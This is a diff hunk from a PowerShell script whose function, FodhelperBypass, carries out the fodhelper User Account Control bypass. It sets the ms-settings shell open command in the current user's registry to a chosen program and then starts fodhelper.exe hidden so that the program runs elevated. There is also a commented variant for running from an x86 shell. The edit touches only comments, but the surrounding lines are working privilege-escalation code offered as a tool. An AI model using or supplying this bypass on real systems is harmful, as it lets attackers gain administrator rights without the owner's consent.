@@ -39,10 +39,10 @@ function FodhelperBypass(){
 	Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
 
 	#Perform the bypass
-		#In Windows x64
+		#x64 shell in Windows x64 | x86 shell in Windows x86
 		Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
-		#In Windows x86
+		#x86 shell in Windows x64
 		#C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden"
 
 	#Remove registry structure
